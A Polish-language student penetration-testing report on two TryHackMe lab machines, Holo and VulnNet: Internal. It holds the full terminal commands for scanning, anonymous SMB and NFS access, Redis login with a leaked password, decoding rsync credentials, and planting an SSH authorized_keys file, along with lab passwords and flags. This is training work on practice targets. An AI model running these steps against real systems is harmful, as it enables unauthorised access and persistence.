# Projek 3 z kursu Cybersecutryty w SDAcademy.
## Założenia projektu:

1. Dwie obowiąskowe maszyny na portalu e-lerning TryHackMe.com:
    * https://tryhackme.com/room/hololive
    * https://tryhackme.com/room/vulnnetinternal
2. Trzy osobowa grupa:
    
    [Justyna A.](https://github.com/Enwalme)

    [Jacek B.](https://github.com/Jacek1983)

    [Adrian G.](https://www.linkedin.com/in/adrian-gizi%C5%84ski-8999b2261/)
3. Stworzenie raportu z testów penetracyjnych owych maszyn.

## Maszyna [Holo:](https://tryhackme.com/room/hololive)

![:(](/screens/zrzut_THM_HOLO_front.bmp)

1. sprawdzam co mogę znaleźć za pomocą różnych narzedzi w sieci.

    wykorzystane narzędzia z poleceniami:
```
┌──(kali㉿kali)-[~/Desktop/TryHackMe]
└─# nmap -sV -sC -p- -v 10.200.111.0/24 (sugerowane wykorzystanie nmap w opisie)

┌──(kali㉿kali)-[~/Desktop/TryHackMe]
└─# sudo nmap -Pn -A -sV --script=default,vuln -p- --open 10.200.111.33

┌──(kali㉿kali)-[~/Desktop/TryHackMe]
└─# enum4linux 10.200x.111.33

┌──(kali㉿kali)-[~/Desktop/TryHackMe]
└─# enum4linux 10.200.111.250
```

2. Na lokalnym linux-ie tworze katalog Holo i przechodzę do niego. Kolejno tworzę plik do którego będę zapisywać wszystkie dane. Następnie poleceniem cat i grep wyszukuję interesujących danych.
```
┌──(kali㉿kali)-[~/Desktop/TryHackMe]
└─$ mkdir Holo           
                                                                                 
┌──(kali㉿kali)-[~/Desktop/TryHackMe]
└─$ cd Holo                               
                                                                                 
┌──(kali㉿kali)-[~/Desktop/TryHackMe/Holo]
└─$ nano
                                                                                 
┌──(kali㉿kali)-[~/Desktop/TryHackMe/Holo]
└─$ cat nmap_10.200.x.0_task8.txt | grep open
```
![:(](/screens/task8_grep_open.png)
![:(](/screens/task8_grep_http.png)

* W ten sposób dosyć szybko rozwiązałem Task8

![:(](/screens/task8_odp.bmp)

Następnie zgodnie z zaleceniem wykonuję enumerację za pomocą ```GoBuster ``` i ```Wfuzz  ``` również z [GitHab-a](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-110000.txt) pobieram sugerowaną listę. 

```  
┌──(kali㉿kali)-[~/Desktop/TryHackMe/Holo]
└─# gobuster vhost -u http://www.holo.live/ -w list_task9.txt 

┌──(kali㉿kali)-[~/Desktop/TryHackMe/Holo]
    
gobuster vhost -u http://ip-10-200-111-33.eu-west-1.compute.internal:80/ -wlist_task9.txt
```


## Maszyna [VulnNet: Internal:](https://tryhackme.com/room/vulnnetinternal)

    UWAGA: Adresy IP maszyny atakowanej będą się różnić na zrzutach ekranu gdyż były tworzone podczas krótkich sesii a nie pojedyńczego rozwiązania tego pokoju.

1. Na początek zaczynam od użycia narzędzia nmap.

```
┌──(root㉿kali)-[~]
└─# sudo nmap -Pn -A -sV --script=default,vuln -p- --open -oA 10.10.238.20_nmap 10.10.238.20
```
Z zapisanego pliku z nmap-a ```gerp-uje``` otwarte porty.

![:(](/screens/VulnNet__nmap_grep_open.jpg)

Dalszą opserwację skupiam na SMB (porty 139 i 445). Za pomocą ```enum4linux``` sprawdzam co tam się znajduję.
```
┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
└─$ enum4linux -a 10.10.3.126 
```
![;(](/screens/v_enum4linux.gif)

Za pomocą ```enum4linux``` znalazłem również użytkownika ```sys-internal```

2. Za pomocą polecenia ```smbclient``` sprawdzam i pobieram wszystkie zasobi z katalogu ```//IP_maszyny/shares```.
```
┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
└─$ smbclient -N //10.10.39.174/shares

smb: \> ls

smb: \> cd /temp/

smb: \temp\> get services.txt
```



![:(](/screens/v_smbclient_flag.gif)

Po przejrzeniu pobranych plików znalazłem pierwszą flagę.

3. Kolejno skupiam się na usłudze NFS na porcie 2049.

    NFS to system typu klient/serwer, który umożliwia użytkownikom dostęp do plików przez sieć i traktowanie ich tak, jakby znajdowały się w lokalnym katalogu plików.

za pomocą polecenia ```mkdir``` tworzę katalog do którego zamontuję udostępnione przez NFS katalogi.
Następnie pobieram i przeglądam wszystkie dane. Zwracam uwagę na plik ```redis.conf``` w nim znajduę klucz do usługi ```Redis```.

```
┌──(kali㉿kali)-[~]
└─$ mkdir /tmp/mount  
┌──(kali㉿kali)-[~]
└─$ sudo mount -t nfs 10.10.161.43: /tmp/mount/ -nolock
[sudo] password for kali: 
                                                                                 
┌──(kali㉿kali)-[~]
└─$ ls -ls /tmp/mount
total 4
4 drwxr-xr-x 4 root root 4096 Feb  2  2021 opt
                                                                                 
┌──(kali㉿kali)-[~]
└─$ cd /tmp/mount                                      
                                                                                 
┌──(kali㉿kali)-[/tmp/mount]
└─$ ls               
opt
                                                                                 
┌──(kali㉿kali)-[/tmp/mount]
└─$ cd opt       
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt]
└─$ ls
conf
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt]
└─$ sl -la                                             
sl: command not found
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt]
└─$ ls -la                                  
total 12
drwxr-xr-x  4 root root 4096 Feb  2  2021 .
drwxr-xr-x 24 root root 4096 Feb  6  2021 ..
drwxr-xr-x  9 root root 4096 Feb  2  2021 conf
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt]
└─$ cd conf 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la
total 36
drwxr-xr-x 9 root root 4096 Feb  2  2021 .
drwxr-xr-x 4 root root 4096 Feb  2  2021 ..
drwxr-xr-x 2 root root 4096 Feb  2  2021 hp
drwxr-xr-x 2 root root 4096 Feb  2  2021 init
drwxr-xr-x 2 root root 4096 Feb  2  2021 opt
drwxr-xr-x 2 root root 4096 Feb  2  2021 profile.d
drwxr-xr-x 2 root root 4096 Feb  2  2021 redis
drwxr-xr-x 2 root root 4096 Feb  2  2021 vim
drwxr-xr-x 2 root root 4096 Feb  2  2021 wildmidi
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls    
hp  init  opt  profile.d  redis  vim  wildmidi
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la hp
total 12
drwxr-xr-x 2 root root 4096 Feb  2  2021 .
drwxr-xr-x 9 root root 4096 Feb  2  2021 ..
-rw-r--r-- 1 root root  961 Feb  2  2021 hplip.conf
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp hp/hplip.conf ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la init 
total 20
drwxr-xr-x 2 root root 4096 Feb  2  2021 .
drwxr-xr-x 9 root root 4096 Feb  2  2021 ..
-rw-r--r-- 1 root root  278 Feb  2  2021 anacron.conf
-rw-r--r-- 1 root root 1444 Feb  2  2021 lightdm.conf
-rw-r--r-- 1 root root  453 Feb  2  2021 whoopsie.conf
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp init/anacron.conf ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp init/lightdm.conf ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp init/whoopsie.conf ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la opt       
total 8
drwxr-xr-x 2 root root 4096 Feb  2  2021 .
drwxr-xr-x 9 root root 4096 Feb  2  2021 ..
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la profile.d 
total 24
drwxr-xr-x 2 root root 4096 Feb  2  2021 .
drwxr-xr-x 9 root root 4096 Feb  2  2021 ..
-rw-r--r-- 1 root root  664 Feb  2  2021 bash_completion.sh
-rw-r--r-- 1 root root 1003 Feb  2  2021 cedilla-portuguese.sh
-rw-r--r-- 1 root root  652 Feb  2  2021 input-method-config.sh
-rw-r--r-- 1 root root 1941 Feb  2  2021 vte-2.91.sh
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp profile.d/bash_completion.sh ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp profile.d/cedilla-portuguese.sh ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp profile.d/input-method-config.sh ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp profile.d/vte-2.91.sh ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la redis    
total 68
drwxr-xr-x 2 root root  4096 Feb  2  2021 .
drwxr-xr-x 9 root root  4096 Feb  2  2021 ..
-rw-r--r-- 1 root root 58922 Feb  2  2021 redis.conf
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp redis/redis.conf ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la vim                                             
total 16
drwxr-xr-x 2 root root 4096 Feb  2  2021 .
drwxr-xr-x 9 root root 4096 Feb  2  2021 ..
-rw-r--r-- 1 root root 2469 Feb  2  2021 vimrc
-rw-r--r-- 1 root root  662 Feb  2  2021 vimrc.tiny
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp vim/vimrc ~/Desktop/TryHackMe/VulnNe_Internal
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp vim/vimrc.tiny ~/Desktop/TryHackMe/VulnNe_Internal 
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ ls -la wildmidi                                      
total 16
drwxr-xr-x 2 root root 4096 Feb  2  2021 .
drwxr-xr-x 9 root root 4096 Feb  2  2021 ..
-rw-r--r-- 1 root root 4542 Feb  2  2021 wildmidi.cfg
                                                                                 
┌──(kali㉿kali)-[/tmp/mount/opt/conf]
└─$ cp wildmidi/wildmidi.cfg ~/Desktop/TryHackMe/VulnNe_Internal 

___________________________________________________

┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
└─$ cat redis.conf 
...
################################# REPLICATION #################################
...
requirepass "B65Hx562F@ggAZ@F"
...

```

4. Instaluję ```redis``` i łaczę się z maszyną za pomocą usługi. Przeglądam i pobieram wszystklie dane. W plikach ```internal flag``` i ```authlist``` znajduję flagę i hash-a. 

```
┌──(root㉿kali)-[~]
└─# sudo apt-get install redis-tools
┌──(kali㉿kali)-[~/Desktop/TryHackMe]
└─$ redis-cli -h 10.10.161.43 -a "B65Hx562F@ggAZ@F"
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.161.43:6379> ls
(error) ERR unknown command 'ls'
10.10.161.43:6379> id
(error) ERR unknown command 'id'
10.10.161.43:6379> cd internal flag
(error) ERR unknown command 'cd'
10.10.161.43:6379> KEYS *
1) "tmp"
2) "internal flag"
3) "int"
4) "marketlist"
5) "authlist"

10.10.161.43:6379> get "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
10.10.161.43:6379> get "tmp"
"temp dir..."
10.10.161.43:6379> cd "tmp"
(error) ERR unknown command 'cd'
10.10.161.43:6379> get "temp dir..."
(nil)
10.10.161.43:6379> cd "tmp/temp dir..."
(error) ERR unknown command 'cd'
10.10.161.43:6379> get "int"
"10 20 30 40 50"
10.10.161.43:6379> get "marketlist"
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.161.43:6379> get "authilist"
(nil)
10.10.161.43:6379> get "authlist"
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.161.43:6379> LEANGE "authlist" 0 999
(error) ERR unknown command 'LEANGE'
10.10.161.43:6379> LRANGE "authlist" 0 999
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
```
![:(](/screens/v_redis_2_flag%26hash.bmp)

Znalezionego HASH-a sprawdzam za pomocą [hashes.com](https://hashes.com/en/tools/hash_identifier).
Uzyskuję możliwość logowania za pomocą ```rsync```.

    QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg== - Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v - Possible algorithms: Base64 Encoded String
![:(](/screens/v_hashes.png)

4. Rsync - po zalogowaniu się okazało się, że możemy zobaczyć plik txt z kolejną flagą ale nie miałem pomysłu jak mogę go pobrać lub otworzyć. W rozwiązaniu tego plroblemu bardzo pomocny okazał się [ChatGPT](https://chat.openai.com/chat). Pobralem załą zawartość do której dawał mi dostęp ```rsync```. Po pobraniu katalogu ```files``` za pomocą polecenia ```sudo chmod -R 777 sys-internal``` zmieniłem uprawnienia dla wszystkich plików. W ten sposób zdobyłem kolejna flage.
```                              
┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
└─$ rsync --list-only rsync://rsync-connect@10.10.161.43/files/sys-internal
Password: 
drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal
                                                                                 
┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
└─$ rsync --list-only rsync://rsync-connect@10.10.161.43/files/sys-internal/
Password: 
drwxr-xr-x          4,096 2021/02/06 07:49:29 .
-rw-------             61 2021/02/06 07:49:28 .Xauthority
lrwxrwxrwx              9 2021/02/01 08:33:19 .bash_history
-rw-r--r--            220 2021/02/01 07:51:14 .bash_logout
-rw-r--r--          3,771 2021/02/01 07:51:14 .bashrc
-rw-r--r--             26 2021/02/01 07:53:18 .dmrc
-rw-r--r--            807 2021/02/01 07:51:14 .profile
lrwxrwxrwx              9 2021/02/02 09:12:29 .rediscli_history
-rw-r--r--              0 2021/02/01 07:54:03 .sudo_as_admin_successful
-rw-r--r--             14 2018/02/12 14:09:01 .xscreensaver
-rw-------          2,546 2021/02/06 07:49:35 .xsession-errors
-rw-------          2,546 2021/02/06 06:40:13 .xsession-errors.old
-rw-------             38 2021/02/06 06:54:25 user.txt
drwxrwxr-x          4,096 2021/02/02 04:23:00 .cache
drwxrwxr-x          4,096 2021/02/01 07:53:57 .config
drwx------          4,096 2021/02/01 07:53:19 .dbus
drwx------          4,096 2021/02/01 07:53:18 .gnupg
drwxrwxr-x          4,096 2021/02/01 07:53:22 .local
drwx------          4,096 2021/02/01 08:37:15 .mozilla
drwxrwxr-x          4,096 2021/02/06 06:43:14 .ssh
drwx------          4,096 2021/02/02 06:16:16 .thumbnails
drwx------          4,096 2021/02/01 07:53:21 Desktop
drwxr-xr-x          4,096 2021/02/01 07:53:22 Documents
drwxr-xr-x          4,096 2021/02/01 08:46:46 Downloads
drwxr-xr-x          4,096 2021/02/01 07:53:22 Music
drwxr-xr-x          4,096 2021/02/01 07:53:22 Pictures
drwxr-xr-x          4,096 2021/02/01 07:53:22 Public
drwxr-xr-x          4,096 2021/02/01 07:53:22 Templates
drwxr-xr-x          4,096 2021/02/01 07:53:22 Videos

rsync -r rsync://rsync-connect@10.10.120.63/files/ ./rsync
```
Za pomoca polecenia ```ssh-keygen``` po wygenerowaniu kluczy publiczny i prywatrny zmieniam nazwe klucza publicznego za pomoca polecenia ```cp id-rsa.pub auhorized_keys```
nastepnie kopiuje klucz publiczny poleceniem:
```
rsync -r authorized_keys rsync://rsync-connect@10.10.40.161/files/sys-internal/
```
Podobnie robię z aplikacją ```LinEnum``` którą pobieram z [GitHub](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) poleceniem:
```
git clone https://github.com/rebootuser/LinEnum.git
```
